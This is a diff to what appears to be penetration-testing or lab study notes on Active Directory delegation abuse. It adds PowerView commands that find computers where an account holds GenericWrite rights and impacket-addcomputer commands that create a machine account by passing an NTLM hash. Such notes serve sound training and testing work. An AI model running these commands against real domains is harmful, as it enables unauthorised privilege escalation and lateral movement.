@@ -248,15 +248,18 @@ nslookup appsrv01
 
 * Find which computers we can modify using GenericWrite permissions
   *   ```powershell
-      Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {
-          $_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_
-      } | Where-Object { $_.ActiveDirectoryRights -like '*GenericWrite*' }
+      Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Where-Object { $_.ActiveDirectoryRights -like '*GenericWrite*' }
       ```
 
 
+  * OR Specifying domain
+    * ```powershell
+      Get-DomainComputer -Domain ops.comply.com | Get-ObjectAcl -ResolveGUIDs | Foreach-Object { $_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Where-Object { $_.ActiveDirectoryRights -like '*GenericWrite*' }
+      ```
 * Add a New Computer Account (myComputer$) to the Domain
   *   ```powershell
       impacket-addcomputer -computer-name 'myComputer$' -computer-pass 'h4x' corp.com/mary -hashes :942f15864b02fdee9f742616ea1eb778
+      # impacket-addcomputer -computer-name 'myComputer$' -computer-pass 'h4x' ops.comply.com/FILE06$ -hashes :c81c9...
       ```
 
 
@@ -278,6 +281,12 @@ nslookup appsrv01
     ```
 
 </details>
+
+```
+Get-DomainComputer -Domain ops.comply.com | Get-ObjectAcl -ResolveGUIDs | Foreach-Object { $_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_ } | Where-Object { $_.ActiveDirectoryRights -like '*GenericWrite*' }
+```
+
+
 
 <details>
 
